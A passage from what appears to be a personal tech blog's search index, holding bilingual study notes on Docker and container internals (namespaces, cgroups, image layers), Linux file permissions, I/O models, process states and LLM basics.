(/usr/share/nginx/html)inside the container. COPY . /usr/share/nginx/html ","dockerfile-and-indexhtml#dockerfile and index.html":" # index.html \u003ch1\u003eHello World\u003c/h1\u003e ","run#Run":" The built Image can be launched in a consistent way to other Docker Images. When a container launches, it’s sandboxed from other processes and networks on the host. When starting a container you need to give it permission and access to what it requires. For example, to open and bind to a network port on the host you need to provide the parameter -p host-port:container-port.\n# Launch our newly built image providing the friendly name and tag. As it's a web server, bind port 80 to our host using the -p parameter. docker run -d -p 80:80 webserver-image:v1 # Access the results of port 80 curl docker "},"title":"deploy-static-website"},"/blog/katacoda-deploying-first-docker-container/":{"data":{"access-redis#Access redis":"note: each docker container is sandboxed\nsolution1: specify host port is 6379 -p host-port:container-post\ndocker run -d --name redisHostPort -p 6379:6379 redis:latest solution2: specify randomly host port -p container-port\ndocker run -d --name redisDynamic -p 6379 redis:latest docker port redisDynamic 6379 ","find-running-container#Find running container":" docker ps docker inspect \u003ccontainer-id\u003e docker logs \u003ccontainer-id\u003e ","persisting-data#Persisting data":"-v host-dir:container-dir\ndocker run -d --name redisMapped -v /opt/docker/data/redis:/data redis ","running-a-container-backgrounddetached#Running a container background(detached)":"Running a container background(detached)docker search image-name\ndocker search redis docker run options image-name:version solution1: default latest version\ndocker run -d redis solution2: version is 3.2\ndocker run -d redis:3.2 ","running-a-container-foreground#Running a container foreground":" docker run -it ubuntu bash "},"title":"katacoda-deploying-first-docker-container"},"/blog/katacoda-what-is-a-container-image/":{"data":{"":"","container-image#container image":" A container image is a tar file containing tar files. Each of the tar file is a layer. Once all tar files have been extract into the same location then you have the container’s filesystem. container image 是一个 tar 文件. 每一个 tar 文件就是一个 layer\ndocker pull 拉取一个镜像 docker pull redis:3.2.11-alpine 3.2.11-alpine: Pulling from library/redis ff3a5c916c92: Pull complete aae70a2e6027: Pull complete 87c655da471c: Pull complete bc3141806bdc: Pull complete 53616fb426d9: Pull complete 9791c5883c6a: Pull complete Digest: sha256:ebf1948b84dcaaa0f8a2849cce6f2548edb8862e2829e3e7d9e4cd5a324fb3b7 Status: Downloaded newer image for redis:3.2.11-alpine\n可以看到 redis:3.2.11-alpine 这个 image 拉取了 ff3a5c916c92, aae70a2e6027, 87c655da471c, bc3141806bdc, 53616fb426d9, 9791c5883c6a 共 6 次.\ndocker save 验证 image 分层 docker save --help Usage: docker save [OPTIONS] IMAGE [IMAGE...] Save one or more images to a tar archive (streamed to STDOUT by default) Options: -o, --output string Write to a file, instead of STDOUT 验证 redis:3.2.11-alpine 分层 docker save 保存 image 为 tar 文件 docker save redis:3.2.11-alpine \u003e redis.tar 解压 tar 文件 tar -xvf redis.tar tree . ├── 46a2fed8167f5d523f9a9c07f17a7cd151412fed437272b517ee4e46587e5557 │ ├── json // 这一 layer 的配置文件 │ ├── layer.tar │ └── VERSION ├── 498654318d0999ce36c7b90901ed8bd8cb63d86837cb101ea1ec9bb092f44e59 │ ├── json // 这一 layer 的配置文件 │ ├── layer.tar │ └── VERSION ├── ad01e7adb4e23f63a0a1a1d258c165d852768fb2e4cc2d9d5e71698e9672093c │ ├── json // 这一 layer 的配置文件 │ ├── layer.tar │ └── VERSION ├── ca0b6709748d024a67c502558ea88dc8a1f8a858d380f5ddafa1504126a3b018.json // 这个 `image` 的配置文件 ├── da2a73e79c2ccb87834d7ce3e43d274a750177fe6527ea3f8492d08d3bb0123c │ ├── json // 这一 layer 的配置文件 │ ├── layer.tar │ └── VERSION ├── db1a23fc1daa8135a1c6c695f7b416a0ac0eb1d8ca873928385a3edaba6ac9a3 │ ├── json // 这一 layer 的配置文件 │ ├── layer.tar │ └── VERSION ├── f07352aa34c241692cae1ce60ade187857d0bffa3a31390867038d46b1e7739c │ ├── json // 这一 layer 的配置文件 │ ├── layer.tar │ └── VERSION ├── manifest.json ├── redis.tar // docker save 的 tar 文件 └── repositories 查看解压后的 tar 文件 ls 46a2fed8167f5d523f9a9c07f17a7cd151412fed437272b517ee4e46587e5557 498654318d0999ce36c7b90901ed8bd8cb63d86837cb101ea1ec9bb092f44e59 ad01e7adb4e23f63a0a1a1d258c165d852768fb2e4cc2d9d5e71698e9672093c ca0b6709748d024a67c502558ea88dc8a1f8a858d380f5ddafa1504126a3b018.json da2a73e79c2ccb87834d7ce3e43d274a750177fe6527ea3f8492d08d3bb0123c db1a23fc1daa8135a1c6c695f7b416a0ac0eb1d8ca873928385a3edaba6ac9a3 f07352aa34c241692cae1ce60ade187857d0bffa3a31390867038d46b1e7739c manifest.json repositories\n查看 manifest.json [ { \"Config\":\"ca0b6709748d024a67c502558ea88dc8a1f8a858d380f5ddafa1504126a3b018.json\", // 整个 image 的配置文件 \"RepoTags\":[ \"redis:3.2.11-alpine\" // image 的 tag ], \"Layers\":[ \"498654318d0999ce36c7b90901ed8bd8cb63d86837cb101ea1ec9bb092f44e59/layer.tar\", // 1 \"ad01e7adb4e23f63a0a1a1d258c165d852768fb2e4cc2d9d5e71698e9672093c/layer.tar\", // 2 \"da2a73e79c2ccb87834d7ce3e43d274a750177fe6527ea3f8492d08d3bb0123c/layer.tar\", // 3 \"db1a23fc1daa8135a1c6c695f7b416a0ac0eb1d8ca873928385a3edaba6ac9a3/layer.tar\", // 4 \"f07352aa34c241692cae1ce60ade187857d0bffa3a31390867038d46b1e7739c/layer.tar\", // 5 \"46a2fed8167f5d523f9a9c07f17a7cd151412fed437272b517ee4e46587e5557/layer.tar\" // 6 ] } ] 由上可知, redis:3.2.11-alpine 这个 image 有 6 个 *layer.tar 组成. 每一个 layer.tar 对应 image 一层.\n查看 repositories cat repositories 结果如下:\n{\"redis\":{\"3.2.11-alpine\":\"46a2fed8167f5d523f9a9c07f17a7cd151412fed437272b517ee4e46587e5557\"}} 创建一个空的 image build an image from scratch\ndocker import --help Usage: docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]] Import the contents from a tarball to create a filesystem image Options: -c, –change list Apply Dockerfile instruction to the created image -m, –message string Set commit message for imported image\n使用 docker import 生成一个空镜像 tar cv --files-from /dev/null | docker import - empty 生成的 empty 空镜像 ID 如下: sha256:8880ab5b7953a69e0a9252cbeeb537f0667ec10d3f849289117f8434802c0c49\n查看生成的镜像 docker images Creating Image without Dockerfile 得到 BusyBox rootfs curl -LO https://raw.githubusercontent.com/moby/moby/a575b0b1384b2ba89b79cbd7e770fbeb616758b3/contrib/mkimage/busybox-static \u0026\u0026 chmod +x busybox-static 执行 ./busybox-static busybox\nls -lha busybox\n向 busybox 添加一个版本信息\necho KatacodaPrivateBuild \u003e busybox/release 用 busybox 这个文件夹生成一个 image the directory can be converted into a tar and automatically imported into Docker as an image.\ntar -C busybox -c . | docker import - busybox 启动一个容器并查看 release 信息 docker run busybox cat /release busy-static shell 脚本分析 #!/usr/bin/env bash set -e # Exit immediately if a command exits with a non-zero status. rootfsDir=\"$1\" # $1 是第一个参数 shift # 相当于 shift 1, 也就是把第一个参数丢掉, 后面的都前进一步 busybox=\"$(which busybox 2\u003e/dev/null || true)\" # 拿到 busybox 的路径 if [ -z \"$busybox\" ]; then echo \u003e\u00262 'error: busybox: not found' echo \u003e\u00262 ' install it with your distribution \"busybox-static\" package' exit 1 fi if ! ldd \"$busybox\" 2\u003e\u00261 | grep -q 'not a dynamic executable'; then echo \u003e\u00262 \"error: '$busybox' appears to be a dynamic executable\" echo \u003e\u00262 ' you should install your distribution \"busybox-static\" package instead' exit 1 fi mkdir -p \"$rootfsDir/bin\" # 创建 $rootfsDir/bin rm -f \"$rootfsDir/bin/busybox\" # just in case cp \"$busybox\" \"$rootfsDir/bin/busybox\" ( cd \"$rootfsDir\" IFS=$'\\n' modules=( $(bin/busybox --list-modules) ) # 得到 busybox 所有的模块 unset IFS for module in \"${modules[@]}\"; do mkdir -p \"$(dirname \"$module\")\" # ln target linkname ln -sf /bin/busybox \"$module\" # 强制创建符号链接 done ) ","references#References":" busybox-static docker-intro "},"title":"katacoda-what-is-a-container-image"},"/blog/katacoda-what-is-a-container/":{"data":{"":"","capabilities#Capabilities":" Capabilities are groupings about what a process or user has permission to do. These Capabilities might cover multiple system calls or actions, such as changing the system time or hostname.\n查看 redis-server 的 Capabilities The status file also containers the Capabilities flag. A process can drop as many Capabilities as possible to ensure it’s secure.\ncat /proc/$DBPID/status | grep ^Cap 结果如下:\nCapInh: 00000000a80425fb CapPrm: 0000000000000000 CapEff: 0000000000000000 CapBnd: 00000000a80425fb CapAmb: 0000000000000000\n解析 redis-server 的 flags The flags are stored as a bitmask that can be decoded with capsh\ncapsh --decode=00000000a80425fb 解析结果如下:\n0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner, cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap, cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod, cap_audit_write,cap_setfcap","cgroups#CGroups":" CGroups limit the amount of resources a process can consume. These cgroups are values defined in particular files within the /proc directory. CGroups 用来限制一个进程可以使用的资源的量. cgroups 的值被定义在 /proc 文件夹下的特定文件里.\n查看 redis-server 的 CGroups cat /proc/$DBPID/cgroup 得到 redis-server 的容器 ID DBID=$(docker ps --no-trunc | grep 'db' | awk '{print $1}') 查看 redis-server 的 cpu stats 和 usages cat /sys/fs/cgroup/cpu,cpuacct/docker/$DBID/cpuacct.stat 查看 redis-server 的 cpu shares cat /sys/fs/cgroup/cpu,cpuacct/docker/$DBID/cpu.shares 查看所有容器的 memory 的 docker cgroups 配置 ls /sys/fs/cgroup/memory/docker 查看所有的 CGroups ls /sys/fs/cgroup 配置 cgroups 用 cgroups 配置 内存, memory quotes 存放在 memory.limit_in_bytes 这个文件\n容器默认没有内存限制 docker stats db --no-strem ; 只查看一条信息 限制 db 这个容器的内存使用 echo 8000000 \u003e /sys/fs/cgroup/memory/docker/$DBID/memory.limit_in_bytes ","namespace#namespace":" One of the fundamental parts of a container is namespaces. The concept of namespaces is to limit what processes can see and access certain parts of the system, such as other network interfaces or processes When a container is started, the container runtime, such as Docker, will create new namespaces to sandbox the process. By running a process in it’s own Pid namespace, it will look like it’s the only process on the system.\nMount (mnt) Process (pid) Network (net) Interprocess Communication (ipc) UTS (hostnames) aka unix time-sharing system User ID (user) Control group (cgroup) lanched “contained” processes Without using a runtime such as Docker, a process can still operate within it’s own namespace. One tool to help is unshare.\n不用 docker 这个 runtime, 也可以用 unshare 这个工具来创建一个拥有自己的 namespace 的进程.\nunshare --help Run a program with some namespaces unshared from the parent.\n运行一个程序, 不共享父进程的某些 namespaces\nunshare --fork --pid --mount-proc bash ps exit namespace 是啥 Namespaces are inode locations on disk. this allows for processes to shared/reused the same namespace, allowing them to view and interact.\nnamespace 是硬盘上的 inode. 这允许 processes 共享/复用相同的 namespace, 允许进程之间可以互相看得到, 互相交流.\n查看 redis-server 的所有 namespace ls -liha /proc/$DBPID/ns attach process to existing NameSpaces nsenter run a program with namespaces of other processes.\n在其他进程的 namespace 中运行一个程序\nnsenter --help nsenter [options] [\u003cprogram\u003e [\u003cargument\u003e...]] Options: -a, --all enter all namespaces -t, --target \u003cpid\u003e target process to get namespaces from -m, --mount[=\u003cfile\u003e] enter mount namespace -u, --uts[=\u003cfile\u003e] enter UTS namespace (hostname etc) -i, --ipc[=\u003cfile\u003e] enter System V IPC namespace -n, --net[=\u003cfile\u003e] enter network namespace -p, --pid[=\u003cfile\u003e] enter pid namespace -C, --cgroup[=\u003cfile\u003e] enter cgroup namespace -U, --user[=\u003cfile\u003e] enter user namespace -S, --setuid \u003cuid\u003e set uid in entered namespace -G, --setgid \u003cgid\u003e set gid in entered namespace --preserve-credentials do not touch uids or gids -r, --root[=\u003cdir\u003e] set the root directory -w, --wd[=\u003cdir\u003e] set the working directory -F, --no-fork do not fork before exec'ing \u003cprogram\u003e -Z, --follow-context set SELinux context according to --target PID nsenter --target $DBPID --mount --uts --ipc --net --pid ps aux 在 redis-server 的 mount, uts, ipc, net, pid 这些命名空间里执行 ps 命令\nshare namespaces of redis-server With Docker, these namespaces can be shared using the syntax container:\u003ccontainer-name\u003e. For example, the command below will connect nginx to the DB namespace\ndocker run -d --name=web --net=container:db nginx:alpine 启动 nginx 的容器. 共享 redis-server 的 net namespace\n查看 nginx 容器的 net 的 namespace ls -lha /proc/$WEBPID/ns/ | grep net dr-x–x–x 2 systemd-network systemd-journal 0 Dec 24 13:40 . dr-xr-xr-x 9 systemd-network systemd-journal 0 Dec 24 13:40 .. lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 cgroup -\u003e cgroup:[4026531835] lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 ipc -\u003e ipc:[4026532225] lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 mnt -\u003e mnt:[4026532223] lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 net -\u003e net:[4026532160] – 注意这个是共享的 redis-server 的 net 命名空间 lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 pid -\u003e pid:[4026532226] lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 user -\u003e user:[4026531837] lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 uts -\u003e uts:[4026532224]\n查看 redis-server 容器的 net 命名空间 ls -lha /proc/$DBPID/ns/ | grep net lrwxrwxrwx 1 999 packer 0 Dec 24 13:39 net -\u003e net:[4026532160]","process-directory#Process Directory":" Linux is just a series of magic files and contents, this makes it fun to explore and navigate to see what is happening under the covers, and in some cases, change the contents to see the results. The configuration for each process is defined within the /proc directory. If you know the process ID, then you can identify the configuration directory.\n每一个 process 的配置都定义在 /proc 文件夹下. 如果知道 process ID, 就能找到该进程的配置文件夹\nredis-server 进程的配置 找到 redis-server 的 pid DBPID=$(pgrep redis-server) echo Redis is $DBPID ls /proc 查看 redis-server 进程的环境变量 ls /proc/$DBPID cat /proc/$DBPID/environ 结果如下:\nHOSTNAME=f3b9624ce46cSHLVL=2REDIS_DOWNLOAD_SHA= 61db74eabf6801f057fd24b590232f2f337d422280fd19486 eca03be87d3a82bHOME=/home/redisPATH=/usr/local/sb in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-5.0.7.tar.gzREDIS_VERSION=5.0.7PWD=/data\n解析查看:\n'HOSTNAME=5fba1658e4ceSHLVL=2REDIS_DOWNLOAD_SHA=61db74eabf6801f057fd24b590232f2f337d422280fd19486eca03be87d3a82bHOME=/home/redisPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binREDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-5.0.7.tar.gzREDIS_VERSION=5.0.7PWD=/data'.match(/[A-Z]+=[^A-Z]*/g) // regexp 解析查看 key=value docker 容器里执行 env 命令 docker exec -it db env env 内容如下:\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=f3b9624ce46c TERM=xterm REDIS_VERSION=5.0.7 REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-5.0.7.tar.gz REDIS_DOWNLOAD_SHA=61db74eabf6801f057fd24b590232f2f337d422280fd19486eca03be87d3a82b HOME=/root","processes#Processes":" Containers are just normal Linux Processes with additional configuration applied.\n容器只是应用了附加配置的普通 Linux 进程。\nredis container lanch redis-server process Usage: docker run [OPTIONS] IMAGE [COMMAND] [ARG…] docker run –help -d, –detach Run container in background and print container ID –name string Assign a name to the container\ndocker run -d --name=db redis:alpine 在后台启动一个 container name 是 db 的容器, 并打印容器的 ID\nUnable to find image ‘redis:alpine’ locally alpine: Pulling from library/redis 63bc94deeb28: Pull complete 828e397560e3: Pull complete 5902d88df6c2: Pull complete 157b2c953c6d: Pull complete b5212c16b59d: Pull complete 5f8f01031701: Pull complete Digest: sha256:613ab7e1c0175cae18b69c291512e5e8f1129175f6617ff2126b7ac9a1e5c550 Status: Downloaded newer image for redis:alpine 0a5ceea3df52e200d45772c4507b20d7c95a97dcd3939cb33a8d5bc1b842e334\n检验 pidof \u003cprocess-name\u003e pidof redis-server ps ps aux | grep redis-server docker top container-name docker top can help us identify information about the process including the PID (Process ID) and PPID (Parent Process ID)\ndocker top db pstree pstree will list all of the sub processes\npstree -c -p -A $(pgrep dockerd) ","reference#Reference":" what is a container awk ","seccomp-限制可以使用的-syscall#Seccomp 限制可以使用的 syscall":" When assigned to a process it means the process will be limited to a subset of the ability system calls. If it attempts to call a blocked system call is will recieve the error “Operation Not Allowed”. 容器默认可以使用的 syscall\ncat /proc/$DBPID/status cat /proc/$DBPID/status | grep Seccomp The flag meaning are: 0: disabled 1: strict 2: filtering"},"title":"katacoda-what-is-a-container"},"/blog/learn-llm/":{"data":{"post-training#post-training":"对话集结构 —\u003e 一维 token 序列 instruct-gpt\n强化学习 reinforcement learning 监督学习 supervised earning supervised-fine-tuning","pre-training#pre-training":"pre-traininghttps://huggingface.co/spaces/HuggingFaceFW/blogpost-fineweb-v1\n100000 symbols(tokens) raw text —\u003etokenization —\u003e token","references#References":" 视频讲解 https://tiktokenizer.vercel.app/ https://bbycroft.net/llm https://hyperbolic.xyz/ 对话数据集 互联网数据集 ","statistic-token-simulator#statistic token simulator":"这就是所谓的 prediction\n参数 各个 token 的权重\n模型有大量的知识，存储在上亿的参数之中。这些参数可以视为对超大规模的知识进行的一种有损压缩。超大规模知识的模糊记忆。\n按照统计规律给出所谓的答案\n模型需要中间结果\n概率、统计\nin-context learning","tokenization#tokenization":"https://tiktokenizer.vercel.app/?model=cl100k_base"},"title":"Learn Llm"},"/blog/linux-file-permissions/":{"data":{"references#References":" how-do-i-set-up-setuid-setgid-and-sticky-bits-on-linux/ understanding-linux-file-permissions what-is-sticky-bit-permission-and-how-to-use-it basic-file-permissions https://wiki.archlinux.org/title/File_permissions_and_attributes etc-shadow-file crontab useradd ","setgid#setgid":"作用于 file setgid 作用于文件和 setuid 所起作用类似。\n作用于 directory 在该目录下创建的文件或者目录继承该目录的 group。","setuid#setuid":" Setuid is a Linux file permission setting that allows a user to execute that file or program with the permission of the owner of that file. 很明显，setuid 这个权限要和 execute 权限一起使用，作用于可执行文件。\n以 passwd 这个命令为例：\nstardust@os:bin$ ls -l /usr/bin/passwd -rwsr-xr-x 1 root root 68208 Jul 15 2021 /usr/bin/passwd stardust@os:bin$ stat $(which passwd) File: /usr/bin/passwd Size: 68208 Blocks: 136 IO Block: 4096 regular file Device: 812h/2066d Inode: 659228 Links: 1 Access: (4755/-rwsr-xr-x) Uid: ( 0/ root) Gid: ( 0/ root) Access: 2022-04-16 20:28:18.403355543 +0800 Modify: 2021-07-15 06:08:18.000000000 +0800 Change: 2021-10-30 22:33:09.394547633 +0800 Birth: - 可以看到 passwd 这个可执行文件的权限是 rwsr-xr-x 也就是 4755，这才是完整的权限。 rws 中 s 表明 user 组的权限中启用了 setuid。s 表明 execute + setuid。 查看 man passwd 得知 user 的密码以及密码相关信息保存在 /etc/shadow 中，但是 /etc/shadow 的权限是:\nstardust@os:~$ ls -l /etc/shadow -rw-r----- 1 root shadow 1669 Mar 31 23:08 /etc/shadow 可以看到 /etc/shadow 只允许 root 用户进行修改。但是执行 passwd 却可以修改这个文件，这是为什么呢？ 因为 passwd user 权限启用了 setuid，并且 passwd 这个可执行文件的 owner 是 root，这就是 setuid 的作用了。 由于 passwd 启用了 setuid，普通用户，如 stardust 这个用户在执行 passwd 这个程序时，会以 root 用户, 而不是以 stardust 这个用户运行程序，所以 stardust 执行 passwd 是可以修改 /etc/shadow 这个文件的。\n# 1. 查看 passwd 启用了 setuid stardust@os:~$ ls -l /usr/bin/passwd -rwsr-xr-x 1 root root 68208 Jul 15 2021 /usr/bin/passwd # 2. 修改 stardust 密码 stardust@os:~$ passwd stardust Changing password for stardust. Current password: # 另外一个终端查看 stardust@os:Namespaces$ ps -ef | grep passwd root 299906 299450 0 12:03 pts/5 00:00:00 passwd stardust # 3. 可以看出 passwd stardust 是以 root 用户执行的 stardust 300029 299940 0 12:03 pts/6 00:00:00 grep --color=auto passwd 开启 setuid 权限经常使用的命令还有 sudo。\nstardust@os:~$ ls -al /usr/bin/sudo -rwsr-xr-x 1 root root 166056 Jan 19 2021 /usr/bin/sudo ","sticky-bit#sticky-bit":" When sticky bit is set on a directory, the files in that directory can only be removed by the owner. A typical use of this is /tmp/ The /tmp directory can be written to by any user, but other users cannot delete the files of others.\n/tmp 默认开启了 sticky bit stardust@os:tmp$ ls -ld /tmp drwxrwxrwt 25 root root 4096 Apr 17 18:22 /tmp stardust@os:tmp$ mkdir -v stardust-sticky mkdir: created directory 'stardust-sticky' stardust@os:tmp$ ls -ld stardust-sticky/ drwxrwxr-x 2 stardust stardust 4096 Apr 17 18:22 stardust-sticky/ stardust@os:tmp$ su test Password: $ id uid=1002(test) gid=1002(test) groups=1002(test),1000(stardust) $ rm -rf /tmp/stardust-sticky rm: cannot remove '/tmp/stardust-sticky': Operation not permitted # test 这个 user 无法删除 /tmp/stardust-sticky 这个 directory 的。 /tmp 关闭 sticky-bit stardust@os:tmp$ sudo chmod o-t /tmp # 关闭 /tmp 这个目录的 sticky bit stardust@os:tmp$ ls -ld /tmp drwxrwxrwx 25 root root 4096 Apr 17 18:22 /tmp stardust@os:tmp$ su test Password: $ rm -rf /tmp/stardust-sticky # test 这个 user 可以成功删除 stardust 这个用户的 /tmp/stardust-sticky 目录 $ exit stardust@os:tmp$ ls -ld stardust-sticky ls: cannot access 'stardust-sticky': No such file or directory ","权限列表#权限列表":" 最近在使用 k8s 过程中，需要给 mount 的文件配置权限。 提起 file 的权限只想到 rwx，是不全面的,完整的权限是 rwxsStT。\n权限列表","权限导图#权限导图":"","特殊权限#特殊权限":""},"title":"Linux File Permissions"},"/blog/linux-io-model/":{"data":{"":"","io-模型#I/O 模型":"Blocking I/O Non-blocking I/O I/O Multiplexing Signal-Driven I/O Asynchronous I/O ","references#References":" 内核角度看 I/O 模型-强烈推荐 syscall 分类 ","用户空间获取数据前提是什么#用户空间获取数据前提是什么?":" 数据准备阶段 内核准备数据，这就引出了问题，内核还没准备好数据，等(sleep)还是不等？ 比如内核 sock 的 sk_receive_queue 没有数据 内核没准备好数据，进程进入 sleep 状态 -\u003e 阻塞 IO 内核没准备好数据，进程不进入 sleep 状态 -\u003e 非阻塞 IO 数据拷贝阶段 数据从内核空间复制到用户空间，这就引出了问题，谁来负责复制? 比如内核 sock 的 sk_receive_queue 的数据由谁来复制到用户空间 由用户线程的内核态来负责 -\u003e 同步 IO 由内核线程负责 -\u003e 异步 IO 根据以上两大阶段理解 block/non-block sync/async "},"title":"Linux Io Model"},"/blog/linux-kernel-analysis-1/":{"data":{"analysis01#analysis01":"analysis01","linux-kernel#Linux Kernel":"双链表 结构 struct list_head{ struct list_head *next , *prev }; 这个结构很有意思, 改变两个指针的含义, 会发现几乎描述了很多数据结构. 只有一个 *next, 单链表, 只进行头部插入数据-栈, 只进行尾部插入数据-队列 *left, *right\n初始化 define LIST_HEAD_INIT(name){\u0026name, \u0026name} 前后指针都指向自己\n声明并初始化 define LIST_HEAD(name) struct list_head(name){LIST_HEAD_INIT(name)} 判空 static inline int list_empty(const struct list_head*head){ return head-\u003enext == head; } 添加节点 static inline void _ _list_add(struct list_head*new,struct list_head*prev,struct_head*next){ next-\u003eprev = new; new-\u003enext = next; new-\u003eprev = prev; prev-\u003enext = new; } static 该函数作用域仅在本文件内, 可以隐藏信息 inline 编译器展开该函数\nstatic inline void _ _list_add_tail(struct list_head*new,struct list_head*head){ _ _list_add(new,head-\u003eprev,head); } ","内核类型#内核类型":" 单内核 (Linux) 可加载的 Linux 内核模块, 提高维护性.\n微内核 ","设计理念#设计理念":"机制与策略分离 机制 – 提供什么样的功能 策略 – 如何使用这些功能\n说实在的这句话第一次听到还是挺震撼的, 一时觉得大学里的操作系统都不知道在干嘛, 我们学的就是机制, 比如进程创建功能, 进程创建完成后具体如何使用与OS内核不再有关. 文件创建功能, 文件创建完,如何使用交给用户. 其实很类似编程中的接口, 接口定义功能, 实现负责具体的策略."},"title":"linux-kernel-analysis-1"},"/blog/linux-kernel-analysis-2/":{"data":{"数据连续存储和选择读取#数据连续存储和选择读取":"数据连续存储和选择读取"},"title":"linux-kernel-analysis-2"},"/blog/linux-process-state/":{"data":{"":"","key-signals-affecting-process-state#Key Signals Affecting Process State":"• SIGSTOP: Forcefully stops a process.\n• SIGCONT: Resumes a stopped process.\n• SIGTERM: Requests graceful termination.\n• SIGKILL: Forcefully kills a process.","process-state#process state":"Running/Runnable(R) 万事俱备，只需要被 scheduler 调度到 CPU 上去运行。\nInterruptable Sleep(S) 处于这个状态的不会被 scheduler 调度到 CPU 上去运行。\nd_state.c code d_state.c#include \u003cunistd.h\u003e int main(){ pause(); } gcc -o d_state d_state.c ./d_state ps aux | grep d_state Uninterruptible Sleep(D) 可能是 Disk Sleep 的原因。状态用 D 表示。\nStopped(T) 如使用 SIGSTOP 信号，暂停的进程。\nd_state.c code d_state.c#include \u003cunistd.h\u003e int main(){ pause(); } gcc -o d_state d_state.c ./d_state ps aux | grep d_state kill -SIGTSTP $(pidof d_state) ps aux | grep d_state Zombie(Z) 进程已经执行了 exit, exit code 还没有被父进程 wait/waitpid 读取。也就是进程的 PCB 还没有从 kernel 的 process table 中清除。\nzombie.c code zombie.c#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csched.h\u003e int main() { pid_t child_pid = fork(); if (child_pid == 0) { // Child process printf(\"Child PID: %d\\n\", getpid()); exit(0); // Child exits immediately } else { // Parent process printf(\"Parent PID: %d\\n\", getpid()); printf(\"Child PID: %d\\n\", child_pid); printf(\"Parent is sleeping (check for zombie with `ps`).\\n\"); sleep(30); // Parent sleeps (does not call wait()) printf(\"Parent exiting.\\n\"); } return 0; } gcc -o zombie zombie.c ./zombie ps aux | grep zombie ","summary-table#Summary Table":" System Call Purpose Key State Change fork() Create child process Child → Runnable execve() Replace process image Process runs new code exit() Terminate process Process → Zombie wait() Wait for child state change Parent → Sleeping kill() Send signal (e.g., stop/resume) Target → Stopped/Running pause() Sleep until signal Process → Sleeping ptrace() Debug/trace another process Target → Stopped clone() Create thread/process New entity → Runnable These system calls and signals form the backbone of process lifecycle management in Linux, enabling creation, termination, synchronization, and debugging of processes.","system-calls-changing-process-state-on-linux#system calls changing process state on Linux":"fork() 复制状态机器 • Purpose: Creates a new child process by duplicating the parent process.\n• State Change: The child starts in the ready/runnable state (waiting for CPU time).\n• Parameters: None.\n• Return Value:\n• 0 to the child process.\n• Child's PID to the parent.\n• -1 on error.\n• Example: Used in spawning new processes (e.g., shell commands).\nexecve() 复位状态机 • Purpose: Replaces the current process’s memory space with a new program.\n• State Change: The process remains in the running state but executes new code.\n• Parameters:\n• path: Path to the executable.\n• argv: Command-line arguments.\n• envp: Environment variables.\n• Return Value: Only returns on error (-1).\n• Example: Running programs like ls or grep from a shell.\nexit() / _exit() 销毁状态机 • Purpose: Terminates the current process.\n• State Change: Moves the process to zombie (until the parent calls wait()).\n• Parameters:\n• status: Exit status code.\n• Return Value: None (does not return).\n• Difference: exit() flushes buffers; _exit() is a raw system call.\n• Example: Clean termination after program completion.\nwait() / waitpid() 等待子进程退出 • Purpose: Suspends the parent until a child changes state (exits or stops).\n• State Change: Parent enters sleeping state until child exits.\n• Parameters:\n• status: Stores child’s exit status.\n• pid: Specific child to wait for (in waitpid).\n• Return Value: Child PID on success; -1 on error.\n• Example: Parent process ensuring a child completes first.\nkill() / raise() 发送信号 • Purpose: Sends signals to processes (e.g., SIGTERM, SIGSTOP).\n• State Change:\n• SIGSTOP: Moves process to stopped state.\n• SIGCONT: Resumes a stopped process.\n• SIGKILL: Terminates immediately.\n• Parameters:\n• pid: Target process ID.\n• sig: Signal to send.\n• Return Value: 0 on success; -1 on error.\n• Example: Terminating a frozen process via kill -9 PID.\npause() 暂停进程，直到收到信号 • Purpose: Suspends the process until a signal is received.\n• State Change: Process enters interruptable sleeping state.\n• Parameters: None.\n• Return Value: Always -1 (interrupted by signal).\n• Example: Waiting indefinitely for user input or signals.\nnanosleep() 暂停进程一段时间 • Purpose: Pauses execution for a specified time.\n• State Change: Process enters interruptible sleep.\n• Parameters:\n• req: Time to sleep.\n• rem: Remaining time if interrupted.\n• Return Value: 0 on success; -1 on error.\n• Example: High-precision delays in real-time applications.\nptrace() 允许进程控制另一个进程 • Purpose: Allows a process to control another (debugging, tracing).\n• State Change: Traced process enters stopped state on signals.\n• Parameters:\n• request: Action (e.g., PTRACE_ATTACH, PTRACE_CONT).\n• pid: Target process ID.\n• Return Value: Varies by request; -1 on error.\n• Example: Debuggers like gdb using breakpoints.\nclone() • Purpose: Creates a child process or thread with configurable behavior.\n• State Change: New process/thread starts in ready state.\n• Parameters:\n• fn: Function for the child to execute.\n• flags: Options (e.g., CLONE_VM for shared memory).\n• arg: Arguments for fn.\n• Return Value: Child PID on success; -1 on error.\n• Example: Implementing threads (used by pthread library).\nsched_yield() 主动放弃 CPU • Purpose: Voluntarily yields the CPU to other processes/threads.\n• State Change: Process moves from running to ready state.\n• Parameters: None.\n• Return Value: 0 on success; -1 on error.\n• Example: Cooperative multitasking in real-time apps.\nexit_group() 销毁进程中所有线程 • Purpose: Terminates all threads in a process.\n• State Change: All threads enter zombie state.\n• Parameters:\n• status: Exit code.\n• Return Value: Does not return.\n• Example: Terminating multi-threaded applications.","进程状态机#进程状态机":"最近在看南京大学蒋炎岩老师的 2025 操作系统课程。里面有一句话, 计算机中的一切程序可以视为 state machine。很有启发。进程有初始状态, CPU 这个无情的执行指令的机器执行一条指令后，程序的状态就发生了变化。"},"title":"Linux Process State"},"/blog/master-dns-resolve-steps/":{"data":{"":" 分析环境 